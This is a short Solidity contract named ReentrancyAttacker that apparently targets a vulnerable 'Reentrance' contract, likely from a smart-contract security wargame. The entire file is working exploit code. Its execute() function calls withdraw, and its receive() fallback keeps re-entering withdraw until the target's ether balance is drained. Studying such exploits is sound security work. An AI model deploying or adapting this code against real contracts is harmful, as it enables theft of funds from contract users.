// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function withdraw(uint256 _amount) external;
}


contract ReentrancyAttacker {

  IReentrance reentrance;

  constructor(address _reentrance) public {
    reentrance = IReentrance(_reentrance);
  }

  function execute() external {
    reentrance.withdraw(0.01 ether);
  }

  receive() external payable {
    if(address(reentrance).balance > 0) {
      reentrance.withdraw(0.01 ether);
    }
  }

}